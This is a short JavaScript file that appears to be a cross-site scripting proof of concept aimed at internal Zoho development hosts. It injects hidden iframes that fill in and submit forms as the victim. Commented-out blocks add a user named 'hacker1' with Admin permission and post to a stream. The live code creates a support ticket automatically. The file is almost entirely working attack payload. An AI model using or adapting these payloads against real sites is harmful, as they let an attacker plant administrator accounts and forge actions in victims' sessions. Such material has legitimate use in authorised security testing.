//Closing a Ticket.
//alert("XSS");
//var statusVal =  getClosedLabel();assignValue('Cases','e01c0e3e9779439f11465f4d53c73f470b498ee34174141d',encodeURIComponent(statusVal),'Status');

// var iframe = jQuery("<iframe></iframe>");
// jQuery(iframe).attr("src","Security.do?actionName=newUser&frameorigin=https://supportdesk.localzoho.com");
// jQuery(iframe).attr("onload","adduser_hack()");

// jQuery("body").append(iframe);

// function adduser_hack(){
// jQuery(iframe).contents().find('#lastName').val("hacker1");
// jQuery(iframe).contents().find('#j_username').val("nandha@gmail.com");
// jQuery(iframe).contents().find("#perType_Admin").click();
// jQuery(iframe).contents().find("#savebtn").click();
// }

//Adding post in Connect...
// var iframe = jquery("<iframe></iframe>");
// jQuery(iframe).attr("src","&frameorigin=https://connect.localzoho.com");
// jQuery(iframe).attr("onload","adduser_hack()");

// jQuery("body").append(iframe);

// function adduser_hack(){
// jQuery(iframe).contents().find('#newStreamContentarea').val("hacker1");
// jquery(iframe).contents().find('#addstreamButton').click();
// }

//Adding Ticket
var iframe = jQuery("<iframe></iframe>");
jQuery(iframe).attr("src","Create.do?module=Cases&frameorigin=https://supportdev3.localzoho.com");
jQuery(iframe).attr("onload","add_Ticket()");

jQuery("body").append(iframe);

function add_Ticket(){
jQuery(iframe).contents().find("input:text").val('hack@jhj.com') ;
jQuery(iframe).contents().find('#saveButtonId').click();
}
